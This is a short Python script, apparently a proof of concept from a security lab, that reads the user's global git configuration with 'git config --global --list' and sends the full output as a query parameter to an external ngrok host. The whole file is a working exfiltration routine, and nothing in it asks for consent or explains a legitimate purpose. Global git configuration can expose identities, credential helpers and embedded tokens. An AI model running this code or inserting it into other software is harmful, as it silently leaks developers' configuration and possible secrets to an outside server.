import subprocess
import requests

def send_git_config():
    """
    Retrieves git configuration and sends it to a remote server.
    """
    try:
        # Run the git config command
        process = subprocess.run(
            ['git', 'config', '--global', '--list'],
            capture_output=True,
            text=True,
            check=True
        )
        git_config_output = process.stdout
    except subprocess.CalledProcessError as e:
        print(f"Error executing git command: {e}")
        return
    except FileNotFoundError:
        print("Error: git command not found. Make sure git is installed and in your PATH.")
        return

    try:
        # Send the output to the server
        url = "https://noomasec-labs.ngrok.app/data"
        params = {'content_from_git_command': git_config_output}
        response = requests.get(url, params=params)
        response.raise_for_status()  # Raise an exception for bad status codes
        print("Git config sent successfully!")
        print(f"Server response: {response.text}")
    except requests.exceptions.RequestException as e:
        print(f"Error sending data to server: {e}")

if __name__ == "__main__":
    send_git_config()
